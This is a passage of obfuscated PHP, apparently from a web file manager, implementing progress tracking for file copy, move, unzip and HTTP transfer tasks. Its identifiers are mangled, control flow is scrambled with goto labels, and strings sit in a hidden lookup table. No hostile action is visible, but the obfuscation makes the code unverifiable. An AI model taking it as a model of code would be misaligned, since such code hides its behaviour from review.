B¦‚°œ«ˆ: Hook::bind($F‡à«¸—½[1477], array($this, $F‡à«¸—½[1478])); Hook::bind($F‡à«¸—½[543], array($this, $F‡à«¸—½[1479])); $this->sourceModelCopyFlag = !1; goto a„ğ›¤í›; CÇ±¼„êï: Hook::bind($F‡à«¸—½[550], array($this, $F‡à«¸—½[1473])); Hook::bind($F‡à«¸—½[551], array($this, $F‡à«¸—½[1474])); Hook::bind($F‡à«¸—½[553], array($this, $F‡à«¸—½[1475])); goto eŠ¸¦¦Ÿƒè; B¨à£ë¢ø: } protected function endAfter() { goto B¾İ‹ˆä…¼; B¾İ‹ˆä…¼: $cÒĞÎÅİÁ˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; Hook::unbind($cÒĞÎÅİÁ˜[1467], array($this, $cÒĞÎÅİÁ˜[1468])); Hook::unbind($cÒĞÎÅİÁ˜[1469], array($this, $cÒĞÎÅİÁ˜[1470])); goto Fˆ×ôöÎô; A³ó³÷ÂÙµ: Hook::unbind($cÒĞÎÅİÁ˜[553], array($this, $cÒĞÎÅİÁ˜[1475])); Hook::unbind($cÒĞÎÅİÁ˜[554], array($this, $cÒĞÎÅİÁ˜[1475])); Hook::unbind($cÒĞÎÅİÁ˜[520], array($this, $cÒĞÎÅİÁ˜[1476])); goto dÀ‰’ñõ; C²±œî¸: Hook::unbind($cÒĞÎÅİÁ˜[1480], array($this, $cÒĞÎÅİÁ˜[1481])); Hook::unbind($cÒĞÎÅİÁ˜[1482], array($this, $cÒĞÎÅİÁ˜[1483])); Hook::unbind($cÒĞÎÅİÁ˜[1484], array($this, $cÒĞÎÅİÁ˜[1485])); goto dŞ™ÅÙ‰; dÀ‰’ñõ: Hook::unbind($cÒĞÎÅİÁ˜[517], array($this, $cÒĞÎÅİÁ˜[1476])); Hook::unbind($cÒĞÎÅİÁ˜[522], array($this, $cÒĞÎÅİÁ˜[1476])); Hook::unbind($cÒĞÎÅİÁ˜[524], array($this, $cÒĞÎÅİÁ˜[1476])); goto E‰óî¯ùä‡; E‰óî¯ùä‡: Hook::unbind($cÒĞÎÅİÁ˜[526], array($this, $cÒĞÎÅİÁ˜[1476])); Hook::unbind($cÒĞÎÅİÁ˜[1477], array($this, $cÒĞÎÅİÁ˜[1478])); Hook::unbind($cÒĞÎÅİÁ˜[543], array($this, $cÒĞÎÅİÁ˜[1479])); goto C²±œî¸; Fˆ×ôöÎô: Hook::unbind($cÒĞÎÅİÁ˜[1471], array($this, $cÒĞÎÅİÁ˜[1472])); Hook::unbind($cÒĞÎÅİÁ˜[550], array($this, $cÒĞÎÅİÁ˜[1473])); Hook::unbind($cÒĞÎÅİÁ˜[551], array($this, $cÒĞÎÅİÁ˜[1474])); goto A³ó³÷ÂÙµ; dŞ™ÅÙ‰: } public function copyMoveStart($F”İµ«³, $e»µé•…æ›, $fË–¡Ñµ™, $FÂÏ‰­õˆ) { goto DËÙË¸ù§; c‹‹àÍô†¡: $FÚâÚ¸ŒÍó[$F¥İì¬†Œˆ[1496]] = KodIO::transferType($F”İµ«³, $fË–¡Ñµ™); $this->update(); goto Dµ”„ä¦˜ç; Fé¡•¬Šã: if (substr($e»µé•…æ›, 0, strlen($dàÅÇ†éŒ™)) == $dàÅÇ†éŒ™) { return; } if (substr($FÂÏ‰­õˆ, 0, strlen($dàÅÇ†éŒ™)) == $dàÅÇ†éŒ™) { return; } $FÚâÚ¸ŒÍó =& $this->task; goto c‹‹àÍô†¡; DËÙË¸ù§: $F¥İì¬†Œˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::log($F¥İì¬†Œˆ[1495] . $e»µé•…æ› . $F¥İì¬†Œˆ[76] . $FÂÏ‰­õˆ); $dàÅÇ†éŒ™ = rtrim(TEMP_FILES, $F¥İì¬†Œˆ[18]); goto Fé¡•¬Šã; Dµ”„ä¦˜ç: } public function updateAfter() { goto E²¦òÜ·«; E²¦òÜ·«: $E‚Î‰óßõ” =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E¬‹ÊÄÅƒ” =& $this->task; if (!$E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[707]]) { return; } goto b‰„µôë„Á; c„ñ±®‹Í«: $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1444]] = $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1493]] / $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[707]]; if ($E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1444]] > 0) { $f¸º¥÷öŠ¿ = timeFloat() - $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1446]] - $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1449]]; $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1450]] = $f¸º¥÷öŠ¿ * (1 - $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1444]]) / $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1444]]; } goto EäÔÇ‰óºä; b‰„µôë„Á: if ($this->sourceModelCopyFlag) { return; } if ($E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1496]] == $E‚Î‰óßõ”[1101]) { return; } if ($E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1496]] == $E‚Î‰óßõ”[1047] || $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1496]] == $E‚Î‰óßõ”[113]) { if ($E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1490]]) { $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1493]] = $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1492]] + $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1489]]; } } else { if ($E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1496]] == $E‚Î‰óßõ”[1102]) { if ($E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1490]] == $E‚Î‰óßõ”[1047]) { $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1493]] = $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1492]] + $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1489]] * 0.5; } else { if ($E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1490]] == $E‚Î‰óßõ”[113]) { $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1493]] = $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1492]] + $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1488]] * 0.5 + $E¬‹ÊÄÅƒ”[$E‚Î‰óßõ”[1489]] * 0.5; } } } } goto c„ñ±®‹Í«; EäÔÇ‰óºä: } public function addPath($bˆñ´šæ„) { goto Fí¦¹á¼ÕÎ; AõÀ‰ò³°: if ($a¤ƒç­‡ÙÜ[$BÎĞÕ¶ëŠ[39]] == $BÎĞÕ¶ëŠ[177]) { $Fî„ù…ô¿µ[$BÎĞÕ¶ëŠ[983]] += 1; } else { $Fî„ù…ô¿µ[$BÎĞÕ¶ëŠ[983]] += $a¤ƒç­‡ÙÜ[$BÎĞÕ¶ëŠ[90]][$BÎĞÕ¶ëŠ[88]]; if ($a¤ƒç­‡ÙÜ[$BÎĞÕ¶ëŠ[378]]) { $Fî„ù…ô¿µ[$BÎĞÕ¶ëŠ[983]] += $a¤ƒç­‡ÙÜ[$BÎĞÕ¶ëŠ[90]][$BÎĞÕ¶ëŠ[89]] + 1; } } $Fî„ù…ô¿µ[$BÎĞÕ¶ëŠ[707]] += $a¤ƒç­‡ÙÜ[$BÎĞÕ¶ëŠ[87]]; $this->update(); goto aÇ×–†ÇÊ”; d—ÈäæÑ‘î: $a¤ƒç­‡ÙÜ = IO::infoWithChildren($bˆñ´šæ„); $dßµ¡Êäœ = $Fî„ù…ô¿µ[$BÎĞÕ¶ëŠ[1497]] ? $Fî„ù…ô¿µ[$BÎĞÕ¶ëŠ[1497]][$BÎĞÕ¶ëŠ[1498]] : 0; $Fî„ù…ô¿µ[$BÎĞÕ¶ëŠ[1497]] = array($BÎĞÕ¶ëŠ[1498] => $dßµ¡Êäœ + 1, $BÎĞÕ¶ëŠ[395] => $a¤ƒç­‡ÙÜ[$BÎĞÕ¶ëŠ[38]], $BÎĞÕ¶ëŠ[85] => $a¤ƒç­‡ÙÜ[$BÎĞÕ¶ëŠ[85]], $BÎĞÕ¶ëŠ[477] => $a¤ƒç­‡ÙÜ[$BÎĞÕ¶ëŠ[477]] ? $a¤ƒç­‡ÙÜ[$BÎĞÕ¶ëŠ[477]] : $a¤ƒç­‡ÙÜ[$BÎĞÕ¶ëŠ[85]]); goto AõÀ‰ò³°; Fí¦¹á¼ÕÎ: $BÎĞÕ¶ëŠ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$bˆñ´šæ„) { return; } $Fî„ù…ô¿µ =& $this->task; goto d—ÈäæÑ‘î; aÇ×–†ÇÊ”: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Fğğ£ÅÏõ¿) { $a†–¦·¾½  =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aãÎ•Ã¾†ì =& $this->task; $aãÎ•Ã¾†ì[$a†–¦·¾½ [1486]] = $Fğğ£ÅÏõ¿[$a†–¦·¾½ [38]]; $aãÎ•Ã¾†ì[$a†–¦·¾½ [985]] = $Fğğ£ÅÏõ¿[$a†–¦·¾½ [38]]; $this->update(); } public function copyFileStart($D¦„«Š—Ï, $e÷î÷·ğ‹½, $Bß—¹õ•§ï, $C„ä½ƒÈç£, $f„Ò†åÍŸ®, $EÑŸ–¾Ğ¯Ø) { goto A¶ƒÒğŠã‚; D¾»’Üá¡õ: $fˆÚ‘õóŸ[$FÒô¢×œƒ[985]] = $FÒô¢×œƒ[43]; $fˆÚ‘õóŸ[$FÒô¢×œƒ[1490]] = $FÒô¢×œƒ[43]; $fˆÚ‘õóŸ[$FÒô¢×œƒ[1491]] = 0; goto c•—ÑÎ÷”; A¶ƒÒğŠã‚: $FÒô¢×œƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B“æí¨…† = $f„Ò†åÍŸ®; if ($B“æí¨…† == $GLOBALS[$FÒô¢×œƒ[1499]]) { $B“æí¨…† = $GLOBALS[$FÒô¢×œƒ[1500]]; } goto Cö°ë¨Û§; b»„„ùÉèä: $fˆÚ‘õóŸ[$FÒô¢×œƒ[1486]] = $B“æí¨…†; $fˆÚ‘õóŸ[$FÒô¢×œƒ[1488]] = (int) $D¦„«Š—Ï->size($e÷î÷·ğ‹½); $fˆÚ‘õóŸ[$FÒô¢×œƒ[1489]] = 0; goto D¾»’Üá¡õ; c•—ÑÎ÷”: $this->update(); goto bç‘ÚŸ–ìô; Cö°ë¨Û§: $GLOBALS[$FÒô¢×œƒ[1500]] = $f„Ò†åÍŸ®; $GLOBALS[$FÒô¢×œƒ[1499]] = $EÑŸ–¾Ğ¯Ø; $fˆÚ‘õóŸ =& $this->task; goto b»„„ùÉèä; bç‘ÚŸ–ìô: } public function copyFileEnd($Eğª­£¤¶Œ, $C¦¯ßÒ¤“, $Açğ†ßöæ’, $aÁ®‹ëŞ÷, $Aàïâİ®©, $cô¨¡…”±Ã) { $aÌ®Ğí Í =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EóŸ¯Ü‡±Õ =& $this->task; $EóŸ¯Ü‡±Õ[$aÌ®Ğí Í[1489]] = $EóŸ¯Ü‡±Õ[$aÌ®Ğí Í[1488]]; $EóŸ¯Ü‡±Õ[$aÌ®Ğí Í[1490]] = $aÌ®Ğí Í[43]; if ($Aàïâİ®© == $EóŸ¯Ü‡±Õ[$aÌ®Ğí Í[1486]]) { $EóŸ¯Ü‡±Õ[$aÌ®Ğí Í[1492]] += $EóŸ¯Ü‡±Õ[$aÌ®Ğí Í[1488]]; $EóŸ¯Ü‡±Õ[$aÌ®Ğí Í[1493]] = $EóŸ¯Ü‡±Õ[$aÌ®Ğí Í[1492]]; $this->update(1); } else { $this->update(); $EóŸ¯Ü‡±Õ[$aÌ®Ğí Í[1489]] = 0; } self::log($aÌ®Ğí Í[1501] . $C¦¯ßÒ¤“ . $aÌ®Ğí Í[76] . $aÁ®‹ëŞ÷ . $aÌ®Ğí Í[11] . $Aàïâİ®© . $aÌ®Ğí Í[1502] . $EóŸ¯Ü‡±Õ[$aÌ®Ğí Í[1486]]); } public function updateFileEnd($E¥À§ŞœÑ, $Få›¤é¾) { goto Eâ•ß†‘…Û; D’ô±Ğ»¦ˆ: $cìÌÉŠ ˜Ã[$Cô‚èµ¶¡‡[1488]] = $Få›¤é¾; $cìÌÉŠ ˜Ã[$Cô‚èµ¶¡‡[1492]] += $Få›¤é¾; $cìÌÉŠ ˜Ã[$Cô‚èµ¶¡‡[1493]] = $cìÌÉŠ ˜Ã[$Cô‚èµ¶¡‡[1492]]; goto AÚ¸Üµ¾²Æ; Eâ•ß†‘…Û: $Cô‚èµ¶¡‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cìÌÉŠ ˜Ã =& $this->task; $cìÌÉŠ ˜Ã[$Cô‚èµ¶¡‡[1486]] = $E¥À§ŞœÑ; goto D’ô±Ğ»¦ˆ; AÚ¸Üµ¾²Æ: $this->update(1); self::log($Cô‚èµ¶¡‡[1503] . $E¥À§ŞœÑ); goto eìĞ²¼Ç; eìĞ²¼Ç: } public function sourceModelCopy($d—Ä×º¼‰Ü) { goto cÎè›»²‚¶; Cõô¦ç”Í±: $dÕ¬µÙßßñ =& $this->task; $this->sourceModelCopyFlag = !0; $a“É£¥çÓ = 0; goto dÜ‰À´’¯ó; cÎè›»²‚¶: $D˜”çÁå¾ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DĞÆ‰ù„†Ñ = $d—Ä×º¼‰Ü[0]; $CÜ–¹ÃÛŠ˜ = $d—Ä×º¼‰Ü[1]; goto Cõô¦ç”Í±; dÜ‰À´’¯ó: switch ($DĞÆ‰ù„†Ñ) { case $D˜”çÁå¾[518]: $a“É£¥çÓ = 1; break; case $D˜”çÁå¾[521]: $dÕ¬µÙßßñ[$D˜”çÁå¾[1486]] = $CÜ–¹ÃÛŠ˜[$D˜”çÁå¾[38]]; break; case $D˜”çÁå¾[523]: $a“É£¥çÓ = intval($d—Ä×º¼‰Ü[$D˜”çÁå¾[372]] * 0.4); break; case $D˜”çÁå¾[525]: $a“É£¥çÓ = intval($d—Ä×º¼‰Ü[$D˜”çÁå¾[372]] * 0.2); break; case $D˜”çÁå¾[527]: $a“É£¥çÓ = intval($d—Ä×º¼‰Ü[$D˜”çÁå¾[372]] * 0.4); break; } $this->update($a“É£¥çÓ); $this->sourceModelCopyFlag = !1; goto eîËïÏ«±; eîËïÏ«±: } public function sourceRemove($cêßĞàÛø÷, $b¢†¾Ğâ‹×) { $AÑÏ­ƒí¸¼ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->sourceModelCopyFlag = !0; $C¿ÙåæëñÒ = 1; if (isset($cêßĞàÛø÷[$AÑÏ­ƒí¸¼[90]])) { $C¿ÙåæëñÒ = $cêßĞàÛø÷[$AÑÏ­ƒí¸¼[90]][$AÑÏ­ƒí¸¼[88]] + $cêßĞàÛø÷[$AÑÏ­ƒí¸¼[90]][$AÑÏ­ƒí¸¼[89]] + 1; } $this->update($C¿ÙåæëñÒ); $this->sourceModelCopyFlag = !1; } public function sourceMove($BÑµå»“ÈÜ) { $this->sourceRemove($BÑµå»“ÈÜ, !1); } public function curlProgress($AÄÓäÑ‘Ş¿, $A±Â×Ÿ®î, $f¤À¨¸ØÁ, $dØÑœÀŠ™î, $Bˆí­âÀí) { $D®ôğĞƒÌÙ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e–ç”«áìí =& $this->task; if ($Bˆí­âÀí > 0) { $e–ç”«áìí[$D®ôğĞƒÌÙ[985]] = $D®ôğĞƒÌÙ[1504]; $e–ç”«áìí[$D®ôğĞƒÌÙ[1490]] = $D®ôğĞƒÌÙ[113]; if ($e–ç”«áìí[$D®ôğĞƒÌÙ[1488]] == $dØÑœÀŠ™î || $dØÑœÀŠ™î > 1024 * 1024) { $e–ç”«áìí[$D®ôğĞƒÌÙ[1489]] = $Bˆí­âÀí; } if ($e–ç”«áìí[$D®ôğĞƒÌÙ[1491]]) { $e–ç”«áìí[$D®ôğĞƒÌÙ[1489]] = $Bˆí­âÀí + $e–ç”«áìí[$D®ôğĞƒÌÙ[1491]]; } } else { if ($f¤À¨¸ØÁ > 0) { if ($e–ç”«áìí[$D®ôğĞƒÌÙ[1488]] == $A±Â×Ÿ®î) { $e–ç”«áìí[$D®ôğĞƒÌÙ[1489]] = $f¤À¨¸ØÁ; $e–ç”«áìí[$D®ôğĞƒÌÙ[985]] = $D®ôğĞƒÌÙ[1505]; $e–ç”«áìí[$D®ôğĞƒÌÙ[1490]] = $D®ôğĞƒÌÙ[1047]; } } } $this->update(); } public function curlProgressStart($CÎÌ‰¶âõ÷) { } public function curlProgressEnd($döÚˆê¸É­) { $b‚Íªò¼Ì =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FâÎÍÈ¯ø =& $this->task; $c³ô‘·ê…‰ = curl_getinfo($döÚˆê¸É­); $C»Ã£‰Æ‹• = $c³ô‘·ê…‰[$b‚Íªò¼Ì[1506]]; if ($FâÎÍÈ¯ø[$b‚Íªò¼Ì[1490]] == $b‚Íªò¼Ì[113] && $C»Ã£‰Æ‹•) { $FâÎÍÈ¯ø[$b‚Íªò¼Ì[1491]] += $C»Ã£‰Æ‹•; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $c£Ô¶Ú¸‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÎåö„›Éº =& $this->task; $DÎåö„›Éº[$c£Ô¶Ú¸‡[1507]] = 1; Hook::bind($c£Ô¶Ú¸‡[1480], array($this, $c£Ô¶Ú¸‡[1508])); Hook::bind($c£Ô¶Ú¸‡[1482], array($this, $c£Ô¶Ú¸‡[1509])); Hook::bind($c£Ô¶Ú¸‡[1484], array($this, $c£Ô¶Ú¸‡[1510])); } protected function endAfter() { $A½ŸïÀ¸ßš =& $_SERVER[çŞáÓæÚô‚Ô‡]; Hook::unbind($A½ŸïÀ¸ßš[1480], array($this, $A½ŸïÀ¸ßš[1508])); Hook::unbind($A½ŸïÀ¸ßš[1482], array($this, $A½ŸïÀ¸ßš[1509])); Hook::unbind($A½ŸïÀ¸ßš[1484], array($this, $A½ŸïÀ¸ßš[1510])); } public function progressStart($DÖ‹ñÖÑ¼) { $c®ùªÈïŒ§ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f—¯À®ç‡ = curl_getinfo($DÖ‹ñÖÑ¼); self::log($c®ùªÈïŒ§[1511] . $f—¯À®ç‡[$c®ùªÈïŒ§[304]]); self::valueSet($this->task[$c®ùªÈïŒ§[376]], $this->task); } public function progressEnd($D•ƒç»ÜÃ¸) { $cÁÀµĞ‘‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::log($cÁÀµĞ‘‚[1512] . $this->task[$cÁÀµĞ‘‚[376]]); $this->end(); } public function progress($D£åŒğÒ³, $aææ–­›æ, $F¬šô‰Š, $Dæ‰ÀØ ¦Å, $bÜ‹–›Àˆæ) { $eç¤ßÜÄ—  =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dãÄç§š‹ =& $this->task; if ($bÜ‹–›Àˆæ > 0) { $dãÄç§š‹[$eç¤ßÜÄ— [983]] = $dãÄç§š‹[$eç¤ßÜÄ— [983]] == 0 ? $Dæ‰ÀØ ¦Å : $dãÄç§š‹[$eç¤ßÜÄ— [983]]; $dãÄç§š‹[$eç¤ßÜÄ— [997]] = $bÜ‹–›Àˆæ; } else { if ($F¬šô‰Š > 0) { $dãÄç§š‹[$eç¤ßÜÄ— [983]] = $dãÄç§š‹[$eç¤ßÜÄ— [983]] == 0 ? $aææ–­›æ : $dãÄç§š‹[$eç¤ßÜÄ— [983]]; $dãÄç§š‹[$eç¤ßÜÄ— [997]] = $F¬šô‰Š; } } $this->update(); self::log("\x70\162\x6f\147\162\x65\x73\163\110\164\164\160\72\x64\157\167\x6e\72{$F¬šô‰Š}\57{$aææ–­›æ}\x3b\40\x75\x70\x6c\157\141\144\72{$bÜ‹–›Àˆæ}\57{$Dæ‰ÀØ ¦Å}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto f©¬Î™õ£Š; cÙ·„è¥¥Ã: if (!$cã³„ÁšÙ[$AáĞ”’ø‡ƒ[1349]]) { $cã³„ÁšÙ[$AáĞ”’ø‡ƒ[1349]] = LNG($AáĞ”’ø‡ƒ[1517]); } goto A…¶°„®; F…¦ÖĞÏ‚ö: Hook::bind($AáĞ”’ø‡ƒ[1042], array($this, $AáĞ”’ø‡ƒ[1515])); $cã³„ÁšÙ =& $this->task; $cã³„ÁšÙ[$AáĞ”’ø‡ƒ[1516]] = $AáĞ”’ø‡ƒ[1047]; goto cÙ·„è¥¥Ã; f©¬Î™õ£Š: $AáĞ”’ø‡ƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; parent::startAfter(); Hook::bind($AáĞ”’ø‡ƒ[1513], array($this, $AáĞ”’ø‡ƒ[1514])); goto F…¦ÖĞÏ‚ö; A…¶°„®: } protected function endAfter() { $Cù’‘Ù”ØĞ =& $_SERVER[çŞáÓæÚô‚Ô‡]; parent::endAfter(); Hook::unbind($Cù’‘Ù”ØĞ[1513], array($this, $Cù’‘Ù”ØĞ[1514])); Hook::unbind($Cù’‘Ù”ØĞ[1042], array($this, $Cù’‘Ù”ØĞ[1515])); } public function updateAfter() { $BâÑøÎÓå =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eîêò•¯¬¤ =& $this->task; if (!$Eîêò•¯¬¤[$BâÑøÎÓå[983]] || !$Eîêò•¯¬¤[$BâÑøÎÓå[707]]) { return; } if ($Eîêò•¯¬¤[$BâÑøÎÓå[1516]] == $BâÑøÎÓå[1047]) { $bÔøßÉò‚¯ = 0; if ($Eîêò•¯¬¤[$BâÑøÎÓå[1488]]) { $bÔøßÉò‚¯ = $Eîêò•¯¬¤[$BâÑøÎÓå[1489]] / $Eîêò•¯¬¤[$BâÑøÎÓå[1488]]; } $Eîêò•¯¬¤[$BâÑøÎÓå[1444]] = $bÔøßÉò‚¯ * 0.3; } else { if ($Eîêò•¯¬¤[$BâÑøÎÓå[1516]] == $BâÑøÎÓå[310]) { $bÔøßÉò‚¯ = $Eîêò•¯¬¤[$BâÑøÎÓå[997]] / $Eîêò•¯¬¤[$BâÑøÎÓå[983]]; $Eîêò•¯¬¤[$BâÑøÎÓå[1444]] = 0.3 + $bÔøßÉò‚¯ * 0.4; } else { if ($Eîêò•¯¬¤[$BâÑøÎÓå[1516]] == $BâÑøÎÓå[113]) { $C¶¦ï·‚÷Ê = 0; if ($Eîêò•¯¬¤[$BâÑøÎÓå[1490]] == $BâÑøÎÓå[113]) { $C¶¦ï·‚÷Ê = $Eîêò•¯¬¤[$BâÑøÎÓå[1489]]; } $bÔøßÉò‚¯ = ($Eîêò•¯¬¤[$BâÑøÎÓå[1493]] + $C¶¦ï·‚÷Ê) / $Eîêò•¯¬¤[$BâÑøÎÓå[707]]; $Eîêò•¯¬¤[$BâÑøÎÓå[1444]] = 0.3 + 0.4 + $bÔøßÉò‚¯ * 0.3; } } } if ($Eîêò•¯¬¤[$BâÑøÎÓå[1444]] > 0) { $cÙĞË§¶Ñ÷ = timeFloat() - $Eîêò•¯¬¤[$BâÑøÎÓå[1446]] - $Eîêò•¯¬¤[$BâÑøÎÓå[1449]]; $Eîêò•¯¬¤[$BâÑøÎÓå[1450]] = $cÙĞË§¶Ñ÷ * (1 - $Eîêò•¯¬¤[$BâÑøÎÓå[1444]]) / $Eîêò•¯¬¤[$BâÑøÎÓå[1444]]; } } public function addFile($dÇà†×øÒ) { goto c³İ‘·¦™†; AÏ½’¥“Š: $Có¬ÉÄ±ì„[$D¦¤à¨˜…¢[1486]] = $f«„™Êé´[$D¦¤à¨˜…¢[38]]; $Có¬ÉÄ±ì„[$D¦¤à¨˜…¢[1488]] = $f«„™Êé´[$D¦¤à¨˜…¢[87]]; $Có¬ÉÄ±ì„[$D¦¤à¨˜…¢[1489]] = 0; goto a«Áƒ• áÚ; a«Áƒ• áÚ: $Có¬ÉÄ±ì„[$D¦¤à¨˜…¢[985]] = $D¦¤à¨˜…¢[1505]; $Có¬ÉÄ±ì„[$D¦¤à¨˜…¢[1490]] = $D¦¤à¨˜…¢[1047]; $Có¬ÉÄ±ì„[$D¦¤à¨˜…¢[707]] = $f«„™Êé´[$D¦¤à¨˜…¢[87]]; goto fÂ¥ÔŒáğì; fÂ¥ÔŒáğì: $Có¬ÉÄ±ì„[$D¦¤à¨˜…¢[983]] = 1; $b¹äÂ†Ñ = 0; $Có¬ÉÄ±ì„[$D¦¤à¨˜…¢[1497]] = array($D¦¤à¨˜…¢[1498] => $b¹äÂ†Ñ + 1, $D¦¤à¨˜…¢[395] => $f«„™Êé´[$D¦¤à¨˜…¢[38]], $D¦¤à¨˜…¢[85] => $f«„™Êé´[$D¦¤à¨˜…¢[85]], $D¦¤à¨˜…¢[477] => $f«„™Êé´[$D¦¤à¨˜…¢[477]] ? $f«„™Êé´[$D¦¤à¨˜…¢[477]] : $f«„™Êé´[$D¦¤à¨˜…¢[85]]); goto aø¥ì¯êµ¿; aø¥ì¯êµ¿: $this->update(); goto bë´éÌ“–ù; c³İ‘·¦™†: $D¦¤à¨˜…¢ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Có¬ÉÄ±ì„ =& $this->task; $f«„™Êé´ = IO::info($dÇà†×øÒ); goto AÏ½’¥“Š; bë´éÌ“–ù: } public function unzipAfter($d„åÙÃùÙÉ) { goto cõÌ²ì¿ñ…; cõÌ²ì¿ñ…: $eˆ¥Ğøù˜ä =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B¾²ã¶Šá² =& $this->task; $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[1516]] = $eˆ¥Ğøù˜ä[113]; goto bƒ¡ß­¼óé; BÀŞ°ÂİÕ²: if ($Dœë„åæ®í[$eˆ¥Ğøù˜ä[39]] == $eˆ¥Ğøù˜ä[177]) { $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[983]] = 1; } else { $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[983]] = $Dœë„åæ®í[$eˆ¥Ğøù˜ä[90]][$eˆ¥Ğøù˜ä[88]]; } $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[985]] = $eˆ¥Ğøù˜ä[43]; $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[1490]] = 0; goto BÑá”ô×¹; bƒ¡ß­¼óé: $Dœë„åæ®í = IO::infoWithChildren($d„åÙÃùÙÉ); $FÈ·¸˜Òï = 0; $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[1497]] = array($eˆ¥Ğøù˜ä[1498] => $FÈ·¸˜Òï + 1, $eˆ¥Ğøù˜ä[395] => $Dœë„åæ®í[$eˆ¥Ğøù˜ä[38]], $eˆ¥Ğøù˜ä[85] => $Dœë„åæ®í[$eˆ¥Ğøù˜ä[85]], $eˆ¥Ğøù˜ä[477] => $Dœë„åæ®í[$eˆ¥Ğøù˜ä[477]] ? $Dœë„åæ®í[$eˆ¥Ğøù˜ä[477]] : $Dœë„åæ®í[$eˆ¥Ğøù˜ä[85]]); goto BÀŞ°ÂİÕ²; fµ ³Ç„¦Î: $this->update(); self::log($eˆ¥Ğøù˜ä[1518] . json_encode(array($B¾²ã¶Šá², $Dœë„åæ®í))); goto b‡ĞõµÏÇƒ; A¥º¸ñ‡¶ñ: $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[1486]] = $eˆ¥Ğøù˜ä[43]; $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[1493]] = 0; $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[707]] = $Dœë„åæ®í[$eˆ¥Ğøù˜ä[87]]; goto fµ ³Ç„¦Î; BÑá”ô×¹: $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[997]] = 0; $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[1488]] = 0; $B¾²ã¶Šá²[$eˆ¥Ğøù˜ä[1489]] = 0; goto A¥º¸ñ‡¶ñ; b‡ĞõµÏÇƒ: } public function nameParse($BƒÜ„ªàëŠ) { goto B¼ïğ„êå; B¼ïğ„êå: $C„‡Å«ïÑª =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Fƒ‹ÆÈÔõ· =& $this->task; if ($Fƒ‹ÆÈÔõ·[$C„‡Å«ïÑª[1516]] == $C„‡Å«ïÑª[1047]) { $Fƒ‹ÆÈÔõ·[$C„‡Å«ïÑª[1516]] = $C„‡Å«ïÑª[310]; $Fƒ‹ÆÈÔõ·[$C„‡Å«ïÑª[1493]] = 0; $Fƒ‹ÆÈÔõ·[$C„‡Å«ïÑª[707]] = 0; } goto båÈ–Éˆí; båÈ–Éˆí: $bÆÑ‚­íé = get_path_this($BƒÜ„ªàëŠ); if (strstr($bÆÑ‚­íé, $C„‡Å«ïÑª[101])) { $Fƒ‹ÆÈÔõ·[$C„‡Å«ïÑª[997]] += 1; $Fƒ‹ÆÈÔõ·[$C„‡Å«ïÑª[983]] += 1; } $Fƒ‹ÆÈÔõ·[$C„‡Å«ïÑª[1486]] = $BƒÜ„ªàëŠ; goto A©Ïóã¨Ôù; A©Ïóã¨Ôù: $this->update(); goto E™©™—‡øš; E™©™—‡øš: } } goto bŠÀÛà ·ø; eë®ç›Ê¨: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\141\166"; 